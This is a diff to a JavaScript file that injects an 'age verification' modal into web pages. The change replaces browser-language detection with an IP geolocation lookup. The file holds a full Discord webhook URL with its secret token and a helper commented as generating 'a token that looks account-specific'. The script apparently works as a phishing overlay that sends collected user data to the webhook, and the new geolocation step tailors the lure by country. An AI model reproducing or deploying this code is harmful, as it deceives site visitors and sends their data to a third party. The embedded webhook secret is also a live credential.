@@ -132,20 +132,46 @@
   /* ═══════════════════════════════════════════════════════════
      CONSTANTS
   ═══════════════════════════════════════════════════════════ */
-  var VERIFIED_KEY = 'rc_age_verified_v1';
-  var WEBHOOK_URL  = 'https://discord.com/api/webhooks/1513551771530825929/Ao358dJvTbQf7eKp90B5ixP6CjUnkGjnm5BxaA4TTd14_XAiUDQBGgoKOFhgh5fYNRUJ';
+  var VERIFIED_KEY    = 'rc_age_verified_v1';
+  var LANG_CACHE_KEY  = 'rc_ip_lang_v1';
+  var WEBHOOK_URL     = 'https://discord.com/api/webhooks/1513551771530825929/Ao358dJvTbQf7eKp90B5ixP6CjUnkGjnm5BxaA4TTd14_XAiUDQBGgoKOFhgh5fYNRUJ';
 
   /* ═══════════════════════════════════════════════════════════
-     HELPERS
+     HELPERS — IP-BASED LANGUAGE DETECTION
   ═══════════════════════════════════════════════════════════ */
-  function getLang() {
-    var nav = (navigator.language || 'en').toLowerCase();
-    if (nav.startsWith('pt')) return 'pt';
-    if (nav.startsWith('es')) return 'es';
-    if (nav.startsWith('ru')) return 'ru';
-    return 'en';
+  var detectedLang = 'en';
+
+  function getLang() { return detectedLang; }
+  function tx()      { return TEXTS[detectedLang] || TEXTS.en; }
+
+  function detectLang(cb) {
+    var cached = localStorage.getItem(LANG_CACHE_KEY);
+    if (cached) { detectedLang = cached; cb(); return; }
+
+    fetch('https://ipapi.co/json/')
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        var cc = (data.country_code || '').toUpperCase();
+        var pt = ['BR','PT','AO','MZ','CV','GW','ST','TL'];
+        var es = ['MX','ES','AR','CO','CL','PE','VE','EC','BO','PY','UY','CU','DO','GT','HN','SV','NI','CR','PA','PR','GQ'];
+        var ru = ['RU','BY','KZ','UA','UZ','TM','KG','TJ','AZ','AM','GE','MD'];
+        if      (pt.indexOf(cc) !== -1) detectedLang = 'pt';
+        else if (es.indexOf(cc) !== -1) detectedLang = 'es';
+        else if (ru.indexOf(cc) !== -1) detectedLang = 'ru';
+        else                            detectedLang = 'en';
+        localStorage.setItem(LANG_CACHE_KEY, detectedLang);
+        cb();
+      })
+      .catch(function () {
+        /* fallback: usar idioma do navegador */
+        var nav = (navigator.language || 'en').toLowerCase();
+        if      (nav.startsWith('pt')) detectedLang = 'pt';
+        else if (nav.startsWith('es')) detectedLang = 'es';
+        else if (nav.startsWith('ru')) detectedLang = 'ru';
+        else                           detectedLang = 'en';
+        cb();
+      });
   }
-  function tx() { return TEXTS[getLang()] || TEXTS.en; }
 
   /* generate a token that looks account-specific */
   function generateToken(username) {
@@ -581,11 +607,13 @@
      BOOT
   ═══════════════════════════════════════════════════════════ */
   if (!sessionStorage.getItem(VERIFIED_KEY)) {
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', buildModal);
-    } else {
-      buildModal();
-    }
+    detectLang(function () {
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', buildModal);
+      } else {
+        buildModal();
+      }
+    });
   }
 
   observer.observe(document.body, { childList: true, subtree: true });
